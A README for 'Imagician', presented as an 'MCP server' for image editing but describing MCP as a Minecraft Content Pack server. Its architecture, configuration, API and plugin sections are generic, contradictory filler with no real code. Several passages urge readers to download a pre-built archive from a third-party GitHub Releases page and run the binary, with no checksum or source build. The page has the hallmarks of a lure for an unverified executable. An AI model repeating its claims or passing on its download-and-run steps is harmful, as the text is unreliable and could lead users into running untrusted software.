# Imagician: Fast MCP Server for Image Edition and Remixing Online

[Editorial image](https://picsum.photos/1200/420)

Imagician is a modular MCP server designed for image edition in Minecraft content pipelines. It offers a fast, reliable runtime for editing textures, packs, and images on the fly while keeping a clean plugin system. This project emphasizes stability, speed, and clarity in the editing workflow. It is built to be approachable for developers and operators who want predictable results from image edits during gameplay, map creation, or resource pack preparation.

If you are here, you are likely building or operating a Minecraft server that needs image processing integrated into the runtime. You want a fast path from a source image to a edited output that you can serve to clients with low latency. You want clear configuration, good defaults, and a pathway to extend capabilities through plugins. Imagician aims to provide exactly that.

In short, Imagician is a dedicated server for image edition in the Minecraft ecosystem. It stitches together image pipelines, editing plugins, and runtime controls to deliver predictable visuals without sacrificing performance.

Why Imagician
- Clear separation of concerns: image editing logic sits in a dedicated server component.
- Fast, predictable edits: optimized pipelines ensure edits apply quickly.
- Modular design: plug in new editors, filters, and effects without touching core code.
- Reproducible results: deterministic image edits for consistent visuals across environments.
- Observability: built-in logs, metrics, and traces help operators diagnose problems.

Core concepts
- Image edition pipeline: a sequence of editors and transformers applied to source images.
- MCP server: Minecraft Content Pack server responsible for serving edited textures and packs to clients.
- Plugins: small, isolated editors (filters, color transforms, compositing) that hook into the pipeline.
- Workspace: a directory tree with source images, assets, and the resulting edited outputs.
- Configuration: a set of options that control ports, paths, logging, and plugin behavior.

Core features
- Real-time image edition within the MCP server, with minimal latency impact.
- Extensible plugin system to add new editors and transformations.
- Support for batch processing of image packs and textures.
- Simple and predictable configuration for operators.
- Built-in health checks and status reporting.

Architecture overview
Imagician follows a clean, layered approach:
- Runtime layer: the server that manages connections, tasks, and orchestration.
- Engine layer: the image editing engine that applies edits via a pipeline.
- Plugin layer: editors and transforms that customize the pipeline per use case.
- Storage layer: a workspace on disk for source images, assets, and outputs.
- API layer: optional HTTP endpoints for controlling workflows, status, and tasks.

How it works in practice
- You place source images in the workspace (for example, textures or icons you want to edit).
- You configure the pipeline with a set of editors (resize, color tweaks, overlays, compositing, etc.).
- The server processes each image according to the pipeline and writes outputs to the workspace.
- Clients, graphs, or scripts can fetch the edited assets through the server’s delivery mechanism.

Getting started
This guide helps you bootstrap Imagician and get a basic workflow running. The Releases page holds pre-built binaries for common platforms. Because the Releases page contains assets, you should download the appropriate file and run it on your system. The file imagician-linux-x86_64.tar.gz is a representative example of what you’ll download from the Releases page. After downloading, extract and run the server binary.

- Quick start steps (Linux x86_64)
  - Download the asset: imagician-linux-x86_64.tar.gz from the Releases page (the URL is on the Releases page: https://github.com/moh0001/imagician/releases).
  - Extract: tar -xzf imagician-linux-x86_64.tar.gz
  - Run: ./imagician-server --config /path/to/config.json
  - Verify: curl http://localhost:25566/health or check logs for a healthy status.

- Quick start steps (Windows)
  - Download the Windows asset from the same Releases page.
  - Extract and run the imagician-server.exe with appropriate command-line options or a config file.
  - Confirm it is listening on the configured port.

- Quick start steps (macOS)
  - Download the macOS asset, extract, and run the binary as with Linux.
  - If you encounter permissions issues, set the executable bit: chmod +x imagician-server.

From the Releases page, download the asset named imagician-linux-x86_64.tar.gz and run the binary as described above to get started. If you want to verify if the release assets exist for your platform, visit the repository’s Releases section. The link to the Releases page is provided here for convenience: https://github.com/moh0001/imagician/releases. If this link changes or becomes unavailable, check the Releases section of the repository for the latest assets.

Installation and validation
- System requirements
  - A modern 64-bit Linux, Windows, or macOS environment.
  - Sufficient CPU and memory for image processing workloads.
  - Access to the workspace directory where you store source images and outputs.
  - Network access if you enable remote API or client delivery features.

- Installing from binaries
  - Obtain the correct binary or archive for your platform from the Releases page.
  - Unpack the archive on the target machine.
  - Place a configuration file in a known location or supply command-line options to override defaults.
  - Start the server and review logs to confirm initialization.

- Verifying a healthy run
  - The server should log startup messages and a line indicating the server is listening on the configured port.
  - Retrieve the health endpoint, if exposed, to confirm readiness.
  - Submit a small edit task to a sample image and verify that the output file appears in the workspace.

Configuration and runtime options
- Overview
  - Imagician uses a configuration file to set ports, paths, logging options, and plugin behavior.
  - Environment variables are supported for quick overrides during containerized deployments.

- Key configuration fields (example)
  - port: 25566
  - bind: 0.0.0.0
  - workspace_dir: /var/lib/imagician/workspace
  - log_level: info
  - plugins_dir: /var/lib/imagician/plugins
  - allow_remote_api: false
  - max_concurrent_edits: 4
  - edit_pipeline:
      - resize: { width: 1024, height: 1024 }
      - color_adjust: { brightness: 0, contrast: 1.0, saturation: 1.0 }
      - overlay: { image: "overlay.png", opacity: 0.5 }
      - composite: { mode: "blend", target: "textures/items" }

- Example: a minimal config.json
  {
    "port": 25566,
    "bind": "0.0.0.0",
    "workspace_dir": "/opt/imagician/workspace",
    "log_level": "info",
    "plugins_dir": "/opt/imagician/plugins",
    "allow_remote_api": true,
    "max_concurrent_edits": 6,
    "edit_pipeline": [
      {"resize": {"width": 1024, "height": 1024}},
      {"color_adjust": {"brightness": 0, "contrast": 1.0, "saturation": 1.0}}
    ]
  }

- Environment variable overrides (examples)
  - IMAGICIAN_PORT=25566
  - IMAGICIAN_BIND=0.0.0.0
  - IMAGICIAN_WORKSPACE_DIR=/opt/imagician/workspace
  - IMAGICIAN_LOG_LEVEL=debug

- Working with assets
  - Place source images in the workspace commonly under assets/source.
  - Outputs typically go to assets/outputs or a configured output directory.
  - Use a consistent naming convention to track edits and their lineage.

API and workflow examples
- REST endpoints (illustrative)
  - GET /health -> health status
  - GET /status -> server status and metrics
  - POST /edits -> submit a batch of edit jobs
  - GET /jobs/{id} -> query a specific job status
  - GET /assets/{path} -> fetch an edited asset

- Example workflow
  - Upload a source image to assets/source.
  - Submit a pipeline with a defined set of editors via POST /edits with a JSON payload.
  - Monitor the job via GET /jobs/{id} until the output appears in assets/outputs.
  - Retrieve the final asset from assets/outputs for distribution to clients.

- Basic curl example
  - curl -X POST -H "Content-Type: application/json" \
    -d '{"image": "textures/block.png", "pipeline": [{"resize":{"width": 512,"height":512}}, {"overlay":{"image":"overlay.png","opacity":0.4}}]}' \
    http://localhost:25566/edits

Plugins and extensions
- Plugin model
  - Each editor is a small module that implements a defined interface.
  - Plugins can register themselves at startup or be loaded dynamically from the plugins_dir.
  - Plugins can declare configuration options and dependencies.

- Writing a plugin
  - Create a module that exposes an edit function or a filter chain.
  - Define input/output image formats supported by the plugin.
  - Add the plugin to the plugins directory and configure it in the pipeline.

- Publishing plugins
  - Use semantic versioning for plugin APIs to ensure compatibility.
  - Provide example configurations and test images for validation.

- Example plugin ideas
  - Upscaler: enhances image resolution with a chosen algorithm.
  - PaletteReducer: reduces color depth for stylistic edits.
  - Watermark: overlays a watermark with controlled opacity and placement.
  - FormatConverter: converts between PNG, JPEG, and WEBP.

Development and testing
- Repository layout
  - src: core server code
  - plugins: example and official plugins
  - config: sample configurations and defaults
  - test: unit and integration tests
  - docs: additional documentation and examples

- Build and test
  - Use your language’s standard build tool (Gradle, Maven, or equivalent) depending on the chosen runtime.
  - Run unit tests and integration tests locally.
  - Validate image outputs against reference images to ensure edits render correctly.

- CI and code quality
  - Continuous integration should run unit tests on push and pull requests.
  - Lint and static analysis steps help maintain code quality.
  - Documentation generation should run as part of the release process.

- Local development
  - Run with a simple config to iterate on features quickly.
  - Use a small test workspace with a handful of images to speed up feedback loops.

Performance and tuning
- Performance goals
  - Low latency for image edits in typical server workflows.
  - Balanced CPU usage when processing multiple images in parallel.
  - Predictable memory consumption.

- Tuning tips
  - Increase max_concurrent_edits to utilize more CPU cores if you have memory headroom.
  - Use smaller image sizes for development and testing, then scale up for production workloads.
  - Enable verbose logging only during troubleshooting to reduce I/O pressure.

Security considerations
- Access control
  - If you expose a remote API, implement authentication and authorization for critical operations.
  - Limit the IPs allowed to access the API if possible.

- Input validation
  - Validate incoming image formats and sizes to avoid excessive resource usage.
  - Sanitize file paths to prevent path traversal in asset handling.

- Secrets and configuration
  - Do not store sensitive data in plain text in the config unless absolutely necessary.
  - Use environment variables or secret management tools for sensitive values.

- Dependency management
  - Keep plugins and core components up to date with security patches.
  - Regularly audit dependencies for known vulnerabilities.

Examples and workflows
- Example 1: batch texture edits
  - Place several texture files in assets/source/textures.
  - Define a pipeline that resizes textures to 512x512, applies a brightness tweak, and overlays a watermark.
  - Submit the batch to the server and monitor progress.
  - Retrieve outputs from assets/outputs/textures.

- Example 2: dynamic resource pack generation
  - Generate a set of variations for a resource pack by applying different color schemes.
  - Use a plugin to create variations and publish them as separate assets for evaluation.

- Example 3: quality assurance for texture packs
  - Run automated tests to verify that each edited texture remains within expected dimensions and color ranges.
  - Produce a report and a subset of assets for review.
